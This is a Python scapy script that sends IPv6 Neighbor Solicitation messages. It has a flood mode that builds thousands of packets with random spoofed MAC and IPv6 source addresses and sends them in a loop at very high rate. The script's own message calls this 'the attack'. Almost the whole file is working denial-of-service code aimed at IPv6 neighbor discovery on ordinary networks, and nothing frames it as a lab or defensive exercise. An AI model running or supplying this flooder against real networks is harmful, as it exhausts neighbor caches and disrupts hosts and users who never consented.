#!/usr/bin/python3
import argparse
import random
import sys

import netifaces
from scapy.arch import get_if_hwaddr
from scapy.layers.inet6 import ICMPv6ND_NS, ICMPv6NDOptSrcLLAddr, IPv6
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp, sendpfast

from validate_parameters import is_valid_ipv6, is_valid_mac, mac2ipv6


def main():
    parser = argparse.ArgumentParser(description="Sending Neighbor Solicitation message to the specified target, "
                                                 "with option to flood.")

    parser.add_argument("interface", nargs="?", help="the network interface to use from the sender")
    parser.add_argument("-smac", dest="source_mac", action="store",
                        help="the MAC address of sender (resolved from the interface if skipping)")
    parser.add_argument("-dmac", dest="dest_mac", action="store",
                        help="the MAC address of destination (set to 33:33:00:00:00:01 if skipping)")
    parser.add_argument("-sip", dest="source_ip", action="store", help="the IPv6 address of sender (resolved from the"
                                                                       " interface if skipping)")
    parser.add_argument("-dip", dest="destination_ip", action="store", help="the IPv6 address of destination (ff02::1"
                                                                            " if skipping)")
    parser.add_argument("-tip", dest="target_ip", action="store", help="the IPv6 address of target (set to ff02::1 if "
                                                                       "skipping)")
    parser.add_argument("-f", dest="flood", action="store_true", help="flood the target")

    args = parser.parse_args()

    # Validate the input
    if len(sys.argv) <= 1:
        parser.print_help()
        sys.exit(1)

    # Validate the network interface
    if not args.interface:
        print("---> Network interface is required!!!")
        parser.print_help()
        sys.exit(1)
    interface_list = netifaces.interfaces()
    while True:
        if args.interface in interface_list:
            break
        else:
            print("---> The given interface is invalid. Try again!!!")
            sys.exit(1)

    # Validate the source IPv6 address
    if args.source_ip is None:
        length = len(netifaces.ifaddresses(args.interface)[netifaces.AF_INET6])
        args.source_ip = netifaces.ifaddresses(args.interface)[netifaces.AF_INET6][length - 1]['addr']
        args.source_ip = args.source_ip.replace("%", '')
        args.source_ip = args.source_ip.replace(args.interface, '')
    if args.source_ip is not None:
        if not is_valid_ipv6(args.source_ip):
            print("---> The given source IPv6 address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the destination IPv6 address
    if args.destination_ip is None:
        args.destination_ip = "ff02::1"
    if args.destination_ip is not None:
        if not is_valid_ipv6(args.destination_ip):
            print("---> The given destination IPv6 address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the target IPv6 address
    if args.target_ip is None:
        args.target_ip = "ff02::1"
    if args.target_ip is not None:
        if not is_valid_ipv6(args.target_ip):
            print("---> The given target IPv6 address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the source MAC address
    if args.source_mac is None:
        args.source_mac = get_if_hwaddr(args.interface)
    if args.source_mac is not None:
        if not is_valid_mac(args.source_mac):
            print("---> The given source MAC address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the destination MAC address
    if args.dest_mac is None:
        args.dest_mac = "33:33:00:00:00:01"
    if args.dest_mac is not None:
        if not is_valid_mac(args.dest_mac):
            print("---> The given destination MAC address is invalid. Try again!!!")
            sys.exit(1)

    # Generate the packet
    if not args.flood:
        layer2 = Ether(src=args.source_mac, dst=args.dest_mac)
        layer3 = IPv6(src=args.source_ip, dst=args.destination_ip)
        packet1 = layer2 / layer3 / ICMPv6ND_NS(tgt=args.target_ip) / ICMPv6NDOptSrcLLAddr(lladdr=args.source_mac)
        print("Sending Neighbor Solicitation to the destination: " + args.destination_ip)
        sendp(packet1, verbose=False, iface=args.interface)
    if args.flood:
        pkt_list = []
        for i in range(2000):
            random_mac = "00:18:5b:%02x:%02x:%02x" % (random.randint(0, 255),
                                                      random.randint(0, 255),
                                                      random.randint(0, 255))
            source_ip = mac2ipv6(random_mac)
            layer2 = Ether(src=random_mac, dst="33:33:00:00:00:01")
            layer3 = IPv6(src=source_ip, dst=args.destination_ip)
            packet1 = layer2 / layer3 / ICMPv6ND_NS(tgt=args.target_ip) / ICMPv6NDOptSrcLLAddr(lladdr=random_mac)
            pkt_list.append(packet1)
        print("Flooding the destination: " + args.destination_ip + "with Neighbor Solicitation messages (press Ctrl+C "
                                                                   "to stop the attack).....")
        try:
            sendpfast(pkt_list, mbps=60000, loop=5000000, iface=args.interface)
        except KeyboardInterrupt:
            sys.exit(0)


if __name__ == "__main__":
    main()
